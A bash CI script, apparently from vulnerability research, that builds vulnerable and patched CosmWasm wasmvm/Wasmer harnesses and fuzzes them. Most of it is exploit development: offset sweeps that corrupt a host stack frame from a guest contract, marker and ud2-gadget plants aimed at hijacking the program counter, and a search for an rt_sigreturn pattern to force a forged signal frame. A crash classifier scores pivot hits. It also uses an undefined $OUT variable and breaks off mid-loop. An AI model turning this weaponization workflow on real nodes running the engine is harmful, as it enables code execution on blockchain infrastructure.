#!/usr/bin/env bash
# Heavy CI campaign: build both engines + contract corpus, run the differential
# fuzzer against the vulnerable (wasmvm 1.5.5 / Wasmer 4.2.2) and patched
# (wasmvm 3.0.8 / Wasmer 7.4.2) engines, and record every anomaly.
#
# [6/6] runs the CWA-2026-006 P1 trigger contract (harness/contracts/p1drift)
# through the FULL wasmvm pipeline (Gatekeeper + Metering + CosmWasm ABI).
set -uo pipefail
cd "$(dirname "$0")/.."
mkdir -p ci-out/harness

echo "=== [1/6] toolchains ==="
go version || { echo "FATAL: no go"; exit 1; }
rustup toolchain install 1.81.0 --profile minimal 2>&1 | tail -2 || true
rustup target add wasm32-unknown-unknown --toolchain 1.81.0 2>&1 | tail -1 || true
cargo +1.81.0 --version || { echo "FATAL: no cargo 1.81"; exit 1; }

echo "=== [2/6] build vulnerable harness (wasmvm v1.5.5 / Wasmer 4.2.2) ==="
(cd harness && go build -o harness .) || { echo "FATAL: harness build failed"; exit 1; }
./harness/harness -h >/dev/null 2>&1 || true
echo "harness built"

echo "=== [3/6] build fixed harness (wasmvm v3.0.8 / Wasmer 7.4.2) ==="
(cd harness-fixed && go build -o harness-fixed .) || { echo "FATAL: harness-fixed build failed"; exit 1; }
echo "harness-fixed built"

echo "=== [4/6] build contract corpus ==="
(cd harness/contracts/minimal && cargo +1.81.0 build --release --target wasm32-unknown-unknown) || { echo "FATAL: contract build failed"; exit 1; }
WASM=harness/contracts/minimal/target/wasm32-unknown-unknown/release/minimal.wasm
ls -la "$WASM"

echo "=== [5/6] differential fuzz campaign ==="
CASES="${FUZZ_CASES:-2000}"
echo "cases=$CASES"
python3 harness/fuzz_campaign.py --wasm "$WASM" --cases "$CASES" --seed 1 --out ci-out/harness
RC=$?
echo "campaign rc=$RC"

echo "=== [6/6] CWA-2026-006 P1 trigger through the full wasmvm stack ==="
CONTRACT=harness/contracts/p1drift
P1WASM="$CONTRACT/p1drift.wasm"

# Regenerate the contract from the committed WAT when wasmtime is available;
# otherwise fall back to the committed .wasm binary.
PY=""
if python3 -c "import wasmtime" >/dev/null 2>&1; then
  PY=python3
elif python3 -m venv /tmp/watvenv >/dev/null 2>&1 && /tmp/watvenv/bin/pip install --quiet wasmtime >/dev/null 2>&1; then
  PY=/tmp/watvenv/bin/python3
fi
if [ -n "$PY" ]; then
  "$PY" "$CONTRACT/gen.py" "$CONTRACT/p1drift.wat" 300000 || true
  "$PY" -c "import wasmtime; open('$P1WASM','wb').write(wasmtime.wat2wasm(open('$CONTRACT/p1drift.wat').read()))" \
    && echo "regenerated p1drift.wasm from WAT" || echo "wat2wasm failed; using committed wasm"
else
  echo "wasmtime unavailable; using committed p1drift.wasm"
fi
sha256sum "$P1WASM" | tee ci-out/harness/p1drift.sha256
ls -la "$P1WASM"

echo "--- gas probe (1000 iterations, vulnerable engine) ---"
"$PY" "$CONTRACT/gen.py" /tmp/p1probe.wat 1000 2>/dev/null || true
"$PY" -c "import wasmtime; open('/tmp/p1probe.wasm','wb').write(wasmtime.wat2wasm(open('/tmp/p1probe.wat').read()))" 2>/dev/null || true
timeout 300 ./harness/harness -wasm /tmp/p1probe.wasm -init '{}' -exec '{}' -gas 500000000000 \
  -out ci-out/harness/p1drift-probe-vuln.json > /dev/null 2>&1 || true

echo "--- vulnerable: wasmvm 1.5.5 / Wasmer 4.2.2 (expect call stack exhausted near 65k iters) ---"
timeout 900 ./harness/harness -wasm "$P1WASM" -init '{}' -exec '{}' -gas 10000000000000 \
  -out ci-out/harness/p1drift-vuln.json > ci-out/harness/p1drift-vuln.stdout 2> ci-out/harness/p1drift-vuln.stderr
echo "exit=$?" > ci-out/harness/p1drift-vuln.exit

echo "--- fixed: wasmvm 3.0.8 / Wasmer 7.4.2 (expect clean 300k iters + response) ---"
timeout 900 ./harness-fixed/harness-fixed -wasm "$P1WASM" -init '{}' -exec '{}' -gas 500000000000 \
  -out ci-out/harness/p1drift-fixed.json > ci-out/harness/p1drift-fixed.stdout 2> ci-out/harness/p1drift-fixed.stderr
echo "exit=$?" > ci-out/harness/p1drift-fixed.exit

echo "--- p1drift summary ---"
python3 - <<'PYEOF'
import json, os
for label in ("probe-vuln", "vuln", "fixed"):
    j = f"ci-out/harness/p1drift-{label}.json"
    x = f"ci-out/harness/p1drift-{label}.exit"
    exit_s = open(x).read().strip() if os.path.exists(x) else "?"
    print(f"[{label}] harness exit={exit_s}")
    if os.path.exists(j):
        d = json.load(open(j))
        e = (d.get("executes") or [{}])[0]
        gas = e.get("gas")
        err = e.get("error")
        print(f"  exec_gas={gas} error={err!r} response={bool(e.get('response'))}")
        if gas and not err:
            print(f"  gas/iter ~ {gas // 1000} (probe)" if label == "probe-vuln" else "")
        if err and "call stack exhausted" in str(err):
            print(f"  iterations_reached ~ {gas // 13825300}")
PYEOF

echo "=== [7/7] E6b nested CosmWasm pair (holder -> query -> trigger drift) ==="
NESTED=harness/contracts/nested
if [ -n "$PY" ]; then
  echo "--- E6b drift probes: trigger alone via -query (dense / dense-computed / sparse; 300k iters) ---"
  for MODE in dense dense_computed sparse; do
    D="$NESTED/probe_$MODE"
    if [ "$MODE" = "dense" ]; then
      python3 "$NESTED/gen_nested_contracts.py" "$D" --iters 300000 --dense > /dev/null 2>&1
    elif [ "$MODE" = "dense_computed" ]; then
      python3 "$NESTED/gen_nested_contracts.py" "$D" --iters 300000 --dense --live computed > /dev/null 2>&1
    else
      python3 "$NESTED/gen_nested_contracts.py" "$D" --offset 256 --iters 300000 > /dev/null 2>&1
    fi
    for w in trigger holder benign; do
      "$PY" -c "import wasmtime; open('$D/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D/$w.wat').read()))" 2>/dev/null
    done
    timeout 300 ./harness/harness -wasm "$D/trigger.wasm" -init '{}' -query '{}' -gas 10000000000000 -out "ci-out/harness/probe-$MODE-vuln.json" > "ci-out/harness/probe-$MODE-vuln.stdout" 2> "ci-out/harness/probe-$MODE-vuln.stderr" || true
    echo "  $MODE vuln: $(grep -m1 'query gas' "ci-out/harness/probe-$MODE-vuln.stderr" | cut -c1-160)" | tee -a "$OUT/sweep.log"
    timeout 300 ./harness-fixed/harness-fixed -wasm "$D/trigger.wasm" -init '{}' -query '{}' -gas 10000000000000 -out "ci-out/harness/probe-$MODE-fixed.json" > "ci-out/harness/probe-$MODE-fixed.stdout" 2> "ci-out/harness/probe-$MODE-fixed.stderr" || true
    echo "  $MODE fixed: $(grep -m1 'query gas' "ci-out/harness/probe-$MODE-fixed.stderr" | cut -c1-160)" | tee -a "$OUT/sweep.log"
  done

  echo "--- vulnerable phase sweep (dummy=0, r=218..302, warmups=3, distinct slot markers) ---"
  echo "    geometry: odd warmups => pool [lower B (holder)][guard][upper A (trigger)]; the"
  echo "    stream descends from the trigger into the holder. Holder-side crash PCs in the"
  echo "    previous run clustered on JIT pointers (0x..a10); the alignment sweep below shifts"
  echo "    the holder frame by 8 B per --dummy to walk the batch grid onto a marker slot." >&2
  CRASHES=0
  for R in $(seq 218 302); do
    OFF=$((512 - R))
    ITERS=$((65536 + R + 1))
    D="$NESTED/build_r$R"
    python3 "$NESTED/gen_nested_contracts.py" "$D" --offset "$OFF" --iters "$ITERS" --plants distinct > /dev/null 2>&1 || continue
    for w in holder trigger benign; do
      "$PY" -c "import wasmtime; open('$D/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D/$w.wat').read()))" 2>/dev/null
    done
    if timeout 120 ./harness/harness -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-r$R.json" > "ci-out/harness/nested-vuln-r$R.stdout" 2> "ci-out/harness/nested-vuln-r$R.stderr"; then
      :
    else
      echo "  r$R CRASH/exit=$?" | tee -a "$OUT/sweep.log"
      CRASHES=$((CRASHES+1))
    fi
  done
  echo "phase sweep crashes: $CRASHES / 85" | tee -a "$OUT/sweep.log"

  echo "--- parity grid (frame32 0..3 x dummy 0..3 x r=220..280, distinct slot markers) ---"
  echo "    The batch slides in 16B steps with r, so one qword parity is invariant; a true 8B" >&2
  echo "    shift (frame32 i32 locals in the trigger loop and/or dummy holder locals) flips it." >&2
  for F in 0 1 2 3; do
    for DUMMY in 0 1 2 3; do
      for R in $(seq 220 280); do
        OFF=$((512 - R))
        ITERS=$((65536 + R + 1))
        D="$NESTED/pg_f${F}_d${DUMMY}_r$R"
        python3 "$NESTED/gen_nested_contracts.py" "$D" --offset "$OFF" --iters "$ITERS" --dummy "$DUMMY" --plants distinct --frame32 "$F" > /dev/null 2>&1 || continue
        for w in holder trigger benign; do
          "$PY" -c "import wasmtime; open('$D/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D/$w.wat').read()))" 2>/dev/null
        done
        if timeout 120 ./harness/harness -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-p${F}-d${DUMMY}-r$R.json" > "ci-out/harness/nested-vuln-p${F}-d${DUMMY}-r$R.stdout" 2> "ci-out/harness/nested-vuln-p${F}-d${DUMMY}-r$R.stderr"; then
          :
        else
          CRASHES=$((CRASHES+1))
        fi
      done
    done
    echo "  frame32=$F done (cumulative crashes: $CRASHES)" | tee -a "$OUT/sweep.log"
  done
  echo "parity-grid crashes: $CRASHES / 976" | tee -a "$OUT/sweep.log"

  echo "--- aimed pivot sweep (all planted slots = the harness's own ud2 gadget; warmups=3) ---"
  UD2_OFF=$(objdump -d ./harness/harness 2>/dev/null | grep -m1 -E '^[[:space:]]*[0-9a-f]+:[[:space:]]+0f 0b' | awk '{print $1}' | tr -d ':')
  if [ -n "$UD2_OFF" ]; then
    echo "  harness ud2 gadget @0x$UD2_OFF" | tee -a "$OUT/sweep.log"
    for R in $(seq 225 285); do
      OFF=$((512 - R))
      ITERS=$((65536 + R + 1))
      D="$NESTED/aim_r$R"
      python3 "$NESTED/gen_nested_contracts.py" "$D" --offset "$OFF" --iters "$ITERS" --plants gadget --plant-addr "0x$UD2_OFF" > /dev/null 2>&1 || continue
      for w in holder trigger benign; do
        "$PY" -c "import wasmtime; open('$D/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D/$w.wat').read()))" 2>/dev/null
      done
      timeout 120 ./harness/harness -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-aim-r$R.json" > "ci-out/harness/nested-vuln-aim-r$R.stdout" 2> "ci-out/harness/nested-vuln-aim-r$R.stderr" || true
    done
    echo "  aimed sweep done" | tee -a "$OUT/sweep.log"
  else
    echo "  no ud2 gadget found; aimed sweep skipped" | tee -a "$OUT/sweep.log"
  fi

  echo "--- scan/aim boundary sweep (query-call trigger + stack scanner + ud2 plants; holder --staged) ---"
  echo "    The crossing batch cannot settle in the guard-protected top ~56 B of the holder, so the" >&2
  echo "    resume slot must be pushed deeper by REAL native frame growth => staged locals 10 vs 24." >&2
  UD2B_OFF=$(objdump -d ./harness/harness 2>/dev/null | grep -m1 -E '^[[:space:]]*[0-9a-f]+:[[:space:]]+0f 0b' | awk '{print $1}' | tr -d ':')
  if [ -n "$UD2B_OFF" ]; then
    echo "  ud2 gadget @0x$UD2B_OFF (staged boundary sweep)" | tee -a "$OUT/sweep.log"
    for ST in 10 24; do
      for R in $(seq 220 248); do
        for A in 1 2; do
          OFF=$((512 - R)); ITERS=$((65536 + R + 1)); D2="$NESTED/sa_s${ST}_r${R}_a${A}"
          python3 "$NESTED/gen_nested_contracts.py" "$D2" --offset "$OFF" --iters "$ITERS" --plants gadget --plant-addr "0x$UD2B_OFF" --call-query --staged "$ST" > /dev/null 2>&1 || continue
          for w in holder trigger benign; do
            "$PY" -c "import wasmtime; open('$D2/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D2/$w.wat').read()))" 2>/dev/null
          done
          timeout 120 ./harness/harness -wasm "$D2/holder.wasm" -trigger "$D2/trigger.wasm" -benign "$D2/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -scan -out "ci-out/harness/nested-vuln-sa-s${ST}-r${R}-a${A}.json" > "ci-out/harness/nested-vuln-sa-s${ST}-r${R}-a${A}.stdout" 2> "ci-out/harness/nested-vuln-sa-s${ST}-r${R}-a${A}.stderr" || true
        done
      done
      echo "  staged=$ST done" | tee -a "$OUT/sweep.log"
    done
    echo "  scan/aim sweep done (ud2=0x$UD2B_OFF)" | tee -a "$OUT/sweep.log"
  else
    echo "  no ud2 gadget found; scan/aim sweep skipped" | tee -a "$OUT/sweep.log"
  fi

  echo "--- FULL-PHASE sweep (r=0..511 x2 attempts; plants=ud2 gadget; query trigger) ---"
  echo "    The crossing batch lands 16 B/phase; a fixed resume slot is covered by ONE batch" >&2
  echo "    index per phase. The earlier sweeps only covered r=218..302, missing most phases." >&2
  if [ -n "$UD2B_OFF" ]; then
    for R in $(seq 0 511); do
      OFF=$((512 - R)); ITERS=$((65536 + R + 1))
      for A in 1 2; do
        D4="$NESTED/fp_r${R}_a${A}"
        python3 "$NESTED/gen_nested_contracts.py" "$D4" --offset "$OFF" --iters "$ITERS" --plants gadget --plant-addr "0x$UD2B_OFF" --call-query --staged 10 > /dev/null 2>&1 || continue
        for w in holder trigger benign; do
          "$PY" -c "import wasmtime; open('$D4/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D4/$w.wat').read()))" 2>/dev/null
        done
        timeout 120 ./harness/harness -wasm "$D4/holder.wasm" -trigger "$D4/trigger.wasm" -benign "$D4/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-fp-r${R}-a${A}.json" > "ci-out/harness/nested-vuln-fp-r${R}-a${A}.stdout" 2> "ci-out/harness/nested-vuln-fp-r${R}-a${A}.stderr" || true
      done
      if [ $((R % 64)) -eq 63 ]; then echo "  full-phase r=$R done" | tee -a "$OUT/sweep.log"; fi
    done
    echo "  full-phase sweep done" | tee -a "$OUT/sweep.log"
  else
    echo "  no ud2 gadget found; full-phase sweep skipped" | tee -a "$OUT/sweep.log"
  fi

  echo "--- FULL-PHASE CANARY sweep (r=0..511 x1; UNMAPPED distinct canaries 0x1000000+0x1000k on all 16 live slots) ---"
  echo "    readable plant values are INVISIBLE to load-deref consumption; unmapped canaries label EVERY" >&2
  echo "    consumed slot (deref => addr=canary, exec => PC=canary) across the whole phase space." >&2
  CAN16="0x1000000,0x1001000,0x1002000,0x1003000,0x1004000,0x1005000,0x1006000,0x1007000,0x1008000,0x1009000,0x100a000,0x100b000,0x100c000,0x100d000,0x100e000,0x100f000"
  for R in $(seq 0 511); do
    OFF=$((512 - R)); ITERS=$((65536 + R + 1))
    for A in 1 2; do
      D5="$NESTED/can_r${R}_a${A}"
      python3 "$NESTED/gen_nested_contracts.py" "$D5" --offset "$OFF" --iters "$ITERS" --call-query --staged 10 --plant-values "$CAN16" > /dev/null 2>&1 || continue
      for w in holder trigger benign; do
        "$PY" -c "import wasmtime; open('$D5/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D5/$w.wat').read()))" 2>/dev/null
      done
      timeout 120 ./harness/harness -wasm "$D5/holder.wasm" -trigger "$D5/trigger.wasm" -benign "$D5/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-can-r${R}-a${A}.json" > "ci-out/harness/nested-vuln-can-r${R}-a${A}.stdout" 2> "ci-out/harness/nested-vuln-can-r${R}-a${A}.stderr" || true
    done
    if [ $((R % 64)) -eq 63 ]; then echo "  canary-phase r=$R done" | tee -a "$OUT/sweep.log"; fi
  done
  echo "  full-phase canary sweep done" | tee -a "$OUT/sweep.log"

  echo "--- MARKER RETRY BURST (37 winning parity configs x20; --plants distinct) ---"
  echo "    The 45 GADGET-CONSUMED samples from the parity grid show our distinct markers reaching" >&2
  echo "    consumed slots (addr=0x414141...); burst them to farm a PC=0x41.. (control transfer)." >&2
  for CFG in "0 0 273" "0 0 274" "0 1 273" "0 1 274" "0 1 275" "0 2 243" "0 2 274" "0 2 276" "0 3 274" "0 3 275" "0 3 276" \
             "1 0 272" "1 0 274" "1 1 272" "1 1 273" "1 1 274" "1 2 242" "1 2 274" "1 2 275" "1 3 242" "1 3 273" "1 3 275" \
             "2 0 272" "2 0 273" "2 1 272" "2 1 273" "2 1 274" "2 2 242" "2 2 274" "2 2 275" "2 3 275" \
             "3 0 272" "3 0 273" "3 1 271" "3 1 272" "3 1 273" "3 2 241"; do
    set -- $CFG; F=$1; DUM2=$2; R=$3
    OFF=$((512 - R)); ITERS=$((65536 + R + 1))
    for A in $(seq 1 20); do
      D6="$NESTED/mk_f${F}_d${DUM2}_r${R}_a${A}"
      python3 "$NESTED/gen_nested_contracts.py" "$D6" --offset "$OFF" --iters "$ITERS" --dummy "$DUM2" --plants distinct --frame32 "$F" > /dev/null 2>&1 || continue
      for w in holder trigger benign; do
        "$PY" -c "import wasmtime; open('$D6/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D6/$w.wat').read()))" 2>/dev/null
      done
      timeout 120 ./harness/harness -wasm "$D6/holder.wasm" -trigger "$D6/trigger.wasm" -benign "$D6/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-mk-f${F}-d${DUM2}-r${R}-a${A}.json" > "ci-out/harness/nested-vuln-mk-f${F}-d${DUM2}-r${R}-a${A}.stdout" 2> "ci-out/harness/nested-vuln-mk-f${F}-d${DUM2}-r${R}-a${A}.stderr" || true
    done
    echo "  mk f$F/d$DUM2/r$R done" | tee -a "$OUT/sweep.log"
  done
  echo "  marker retry burst done" | tee -a "$OUT/sweep.log"

  echo "--- CANONICAL-MARKER full-phase sweep (db_read trigger, r=0..511 x2; --plants distinct) ---"
  echo "    The db_read trigger (not query) is the one whose consumers take stream values; canonical" >&2
  echo "    markers make ret/jmp/call to our value fault AT the target (PC=0x4141..., visible)." >&2
  for R in $(seq 0 511); do
    OFF=$((512 - R)); ITERS=$((65536 + R + 1))
    for A in 1 2; do
      D7="$NESTED/dfp_r${R}_a${A}"
      python3 "$NESTED/gen_nested_contracts.py" "$D7" --offset "$OFF" --iters "$ITERS" --dummy 0 --plants distinct --frame32 0 > /dev/null 2>&1 || continue
      for w in holder trigger benign; do
        "$PY" -c "import wasmtime; open('$D7/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D7/$w.wat').read()))" 2>/dev/null
      done
      timeout 120 ./harness/harness -wasm "$D7/holder.wasm" -trigger "$D7/trigger.wasm" -benign "$D7/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-dfp-r${R}-a${A}.json" > "ci-out/harness/nested-vuln-dfp-r${R}-a${A}.stdout" 2> "ci-out/harness/nested-vuln-dfp-r${R}-a${A}.stderr" || true
    done
    if [ $((R % 64)) -eq 63 ]; then echo "  dfp-phase r=$R done" | tee -a "$OUT/sweep.log"; fi
  done
  echo "  canonical-marker full-phase sweep done" | tee -a "$OUT/sweep.log"

  echo "--- CANONICAL-MARKER staged=24 twins (mk configs x20 + full-phase) ---"
  echo "    staged=24 deepens the holder frame -> the consumed slots move; mirror the proven configs" >&2
  echo "    and the full phase sweep with the deeper geometry, canonical labels on." >&2
  for CFG in "0 0 273" "0 0 274" "0 1 274" "2 1 273" "1 0 272" "2 0 272" "2 2 275" "0 2 274" "3 3 273" "1 1 273"; do
    set -- $CFG; F=$1; DUM2=$2; R=$3
    for A in $(seq 1 20); do
      D9="$NESTED/mk24_f${F}_d${DUM2}_r${R}_a${A}"
      python3 "$NESTED/gen_nested_contracts.py" "$D9" --offset $((512-R)) --iters $((65536+R+1)) --dummy "$DUM2" --frame32 "$F" --staged 24 --plants distinct > /dev/null 2>&1 || continue
      for w in holder trigger benign; do
        "$PY" -c "import wasmtime; open('$D9/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D9/$w.wat').read()))" 2>/dev/null
      done
      timeout 120 ./harness/harness -wasm "$D9/holder.wasm" -trigger "$D9/trigger.wasm" -benign "$D9/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-mk24-f${F}-d${DUM2}-r${R}-a${A}.json" > "ci-out/harness/nested-vuln-mk24-f${F}-d${DUM2}-r${R}-a${A}.stdout" 2> "ci-out/harness/nested-vuln-mk24-f${F}-d${DUM2}-r${R}-a${A}.stderr" || true
    done
    echo "  mk24 f$F/d$DUM2/r$R done" | tee -a "$OUT/sweep.log"
  done
  for R in $(seq 0 511); do
    OFF=$((512 - R)); ITERS=$((65536 + R + 1))
    D10="$NESTED/dfp24_r$R"
    python3 "$NESTED/gen_nested_contracts.py" "$D10" --offset "$OFF" --iters "$ITERS" --dummy 0 --frame32 0 --staged 24 --plants distinct > /dev/null 2>&1 || continue
    for w in holder trigger benign; do
      "$PY" -c "import wasmtime; open('$D10/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D10/$w.wat').read()))" 2>/dev/null
    done
    timeout 120 ./harness/harness -wasm "$D10/holder.wasm" -trigger "$D10/trigger.wasm" -benign "$D10/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-dfp24-r${R}.json" > "ci-out/harness/nested-vuln-dfp24-r${R}.stdout" 2> "ci-out/harness/nested-vuln-dfp24-r${R}.stderr" || true
    if [ $((R % 64)) -eq 63 ]; then echo "  dfp24-phase r=$R done" | tee -a "$OUT/sweep.log"; fi
  done
  echo "  staged=24 twins done" | tee -a "$OUT/sweep.log"


  echo "--- SIGRETURN-PATTERN probe (consumed slot -> rt_sigreturn trampoline bytes; signal-frame path) ---"
  echo "    The unwinder's frame-walk check tests [value] for 'mov rax,15; syscall'. Pointing the" >&2
  echo "    consumed slot at a FIXED address holding that pattern (non-PIE .text) flips the walk" >&2
  echo "    onto the signal-frame path (register context restored from the corrupted stack)." >&2
  PAT_ADDR=$(python3 - <<'PYEOF'
import struct
try:
    data = open("harness/harness", "rb").read()
except Exception:
    print(""); raise SystemExit
pat = bytes.fromhex("48c7c00f0000000f05")
i = data.find(pat)
if i < 0:
    print(""); raise SystemExit
phoff = struct.unpack_from("<Q", data, 0x20)[0]
phentsize = struct.unpack_from("<H", data, 0x36)[0]
phnum = struct.unpack_from("<H", data, 0x38)[0]
for j in range(phnum):
    p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align = struct.unpack_from("<IIQQQQQQ", data, phoff + j * phentsize)
    if p_type == 1 and p_offset <= i < p_offset + p_filesz:
        print(hex(p_vaddr + (i - p_offset)))
        break
else:
    print("")
PYEOF
)
  echo "  rt_sigreturn pattern @ ${PAT_ADDR:-none}" | tee -a "$OUT/sweep.log"
  if [ -n "$PAT_ADDR" ]; then
    PATV="${PAT_ADDR},${PAT_ADDR},${PAT_ADDR},${PAT_ADDR},${PAT_ADDR},${PAT_ADDR},0x414100000006,0x414100000007,0x414100000008,0x414100000009,0x41410000000a,0x41410000000b,0x41410000000c,0x41410000000d,0x41410000000e,0x41410000000f"
    for CFG in "0 0 273" "0 0 274" "0 0 275" "0 1 274" "2 1 273" "1 0 272" "2 0 272" "2 2 275" "0 2 274" "3 3 273"; do
      set -- $CFG; F=$1; DUM2=$2; R=$3
      for A in $(seq 1 10); do
        D11="$NESTED/pat_f${F}_d${DUM2}_r${R}_a${A}"
        python3 "$NESTED/gen_nested_contracts.py" "$D11" --offset $((512-R)) --iters $((65536+R+1)) --dummy "$DUM2" --frame32 "$F" --plant-values "$PATV" > /dev/null 2>&1 || continue
        for w in holder trigger benign; do
          "$PY" -c "import wasmtime; open('$D11/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D11/$w.wat').read()))" 2>/dev/null
        done
        timeout 120 ./harness/harness -wasm "$D11/holder.wasm" -trigger "$D11/trigger.wasm" -benign "$D11/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-pat-f${F}-d${DUM2}-r${R}-a${A}.json" > "ci-out/harness/nested-vuln-pat-f${F}-d${DUM2}-r${R}-a${A}.stdout" 2> "ci-out/harness/nested-vuln-pat-f${F}-d${DUM2}-r${R}-a${A}.stderr" || true
      done
      echo "  pat f$F/d$DUM2/r$R done" | tee -a "$OUT/sweep.log"
    done
  fi

  echo "--- fixed control (wasmvm 3.0.8, r=256) ---"
  D="$NESTED/build_r256"
  if timeout 120 ./harness-fixed/harness-fixed -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" -warmups 4 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-fixed-r256.json" > "ci-out/harness/nested-fixed-r256.stdout" 2> "ci-out/harness/nested-fixed-r256.stderr"; then
    echo "  fixed r256 exit=0 (clean)" | tee -a "$OUT/sweep.log"
  else
    echo "  fixed r256 CRASH/exit=$?" | tee -a "$OUT/sweep.log"
  fi
  echo "--- nested summary (classified) ---"
  python3 - <<'PYEOF'
import glob, os, json, re
marker, holder, trigger, hit, clean, errd, aimed = [], [], [], [], [], [], []
canary = []

gadget_consumed = []

def classify(f, dummy):
    base = f.split("/")[-1]
    if base.startswith("nested-vuln-pat-"):
        mm = re.search(r'pat-f(\d+)-d(\d+)-r(\d+)-a(\d+)', f)
        tag = f"pat/f{mm.group(1)}/d{mm.group(2)}/r{mm.group(3)}/a{mm.group(4)}" if mm else f"pat/{base}"
    elif base.startswith("nested-vuln-mk24-"):
        mm = re.search(r'mk24-f(\d+)-d(\d+)-r(\d+)-a(\d+)', f)
        tag = f"mk24/f{mm.group(1)}/d{mm.group(2)}/r{mm.group(3)}/a{mm.group(4)}" if mm else f"mk24/{base}"
    elif base.startswith("nested-vuln-dfp24-"):
        mm = re.search(r'dfp24-r(\d+)', f)
        tag = f"dfp24/r{mm.group(1)}" if mm else f"dfp24/{base}"
    elif base.startswith("nested-vuln-dfp-"):
        mm = re.search(r'dfp-r(\d+)-a(\d+)', f)
        tag = f"dfp/r{mm.group(1)}/a{mm.group(2)}" if mm else f"dfp/{base}"
    elif base.startswith("nested-vuln-mk-"):
        mm = re.search(r'mk-f(\d+)-d(\d+)-r(\d+)-a(\d+)', f)
        tag = f"mk/f{mm.group(1)}/d{mm.group(2)}/r{mm.group(3)}/a{mm.group(4)}" if mm else f"mk/{base}"
    elif base.startswith("nested-vuln-can-"):
        mm = re.search(r'can-r(\d+)-a(\d+)', f)
        tag = f"can/r{mm.group(1)}/a{mm.group(2)}" if mm else f"can/{base}"
    elif base.startswith("nested-vuln-fp-"):
        mm = re.search(r'fp-r(\d+)-a(\d+)', f)
        if mm:
            tag = f"fp/r{mm.group(1)}/a{mm.group(2)}"
        else:
            tag = f"fp/{base}"
    elif base.startswith("nested-vuln-sa-"):
        mm = re.search(r'sa-s(\d+)-r(\d+)-a(\d+)', f)
        if mm:
            tag = f"sa/s{mm.group(1)}/r{mm.group(2)}/a{mm.group(3)}"
        else:
            mm = re.search(r'sa-r(\d+)-d(\d+)-f(\d+)-a(\d+)', f)
            if not mm:
                return
            tag = f"sa/f{mm.group(3)}/d{mm.group(2)}/r{mm.group(1)}/a{mm.group(4)}"
    else:
        m = re.search(r'nested-vuln-(aim-)?(?:p(\d+)-d(\d+)-)?(?:d(\d+)-)?r(\d+)\.stderr$', f)
        if not m:
            return
        is_aim = bool(m.group(1))
        if m.group(2) is not None:
            tag = f"f{m.group(2)}/d{m.group(3)}/r{m.group(5)}"
        else:
            d = int(m.group(4)) if m.group(4) else 0
            tag = f"aim/r{m.group(5)}" if is_aim else (f"d{d}/r{m.group(5)}" if d else f"r{m.group(5)}")
    j = f.replace(".stderr", ".json")
    txt = open(f, errors="replace").read()
    if os.path.exists(j) and os.path.getsize(j) > 0:
        if '"hit"' in open(j, errors="replace").read():
            hit.append(tag)
        else:
            err = ""
            try:
                ej = json.load(open(j))
                err = ((ej.get("executes") or [{}])[0].get("error") or "")
            except Exception:
                pass
            if err:
                errd.append((tag, err[:50]))       # wasm caught the corruption (e.g. OOB access)
            else:
                clean.append(tag)
        return
    mp = re.search(r'PC=0x([0-9a-f]+)', txt)
    ma = re.search(r'addr=0x([0-9a-f]+)', txt)
    pc = mp.group(1) if mp else "?"
    ad = ma.group(1) if ma else "?"
    if "SIGILL" in txt:
        aimed.append((tag, pc))                    # executed a ud2 -> AIMED PIVOT HIT
    elif pc.startswith("4242") or pc.startswith("4141"):
        marker.append((tag, pc))                   # jumped to a planted pivot/marker value
    elif pc.startswith("4") or ad.startswith("4"):
        gadget_consumed.append((tag, pc, ad))      # planted gadget value consumed as code/data
    elif re.fullmatch(r'100[0-9a-f]{4}', pc) or re.fullmatch(r'100[0-9a-f]{4}', ad):
        canary.append((tag, pc, ad))               # UNMAPPED canary consumed -> slot LABELED
    elif "nestedQuerier" in txt:
        trigger.append(tag)                        # crash inside the nested trigger (stream off stack)
    else:
        holder.append((tag, pc))                   # crash after the query returned (holder corrupted!)

for f in sorted(glob.glob("ci-out/harness/nested-vuln-r*.stderr"), key=lambda p: int(p.split("-r")[-1].split(".")[0])):
    classify(f, 0)
for f in sorted(glob.glob("ci-out/harness/nested-vuln-d*-r*.stderr"),
                key=lambda p: (int(p.split("-d")[-1].split("-r")[0]), int(p.split("-r")[-1].split(".")[0]))):
    classify(f, None)
for f in sorted(glob.glob("ci-out/harness/nested-vuln-p*-d*-r*.stderr")):
    classify(f, None)
for f in sorted(glob.glob("ci-out/harness/nested-vuln-aim-r*.stderr"), key=lambda p: int(p.split("-r")[-1].split(".")[0])):
    classify(f, None)
for f in sorted(glob.glob("ci-out/harness/nested-vuln-sa-*.stderr")):
    classify(f, None)
for f in sorted(glob.glob("ci-out/harness/nested-vuln-fp-*.stderr")):
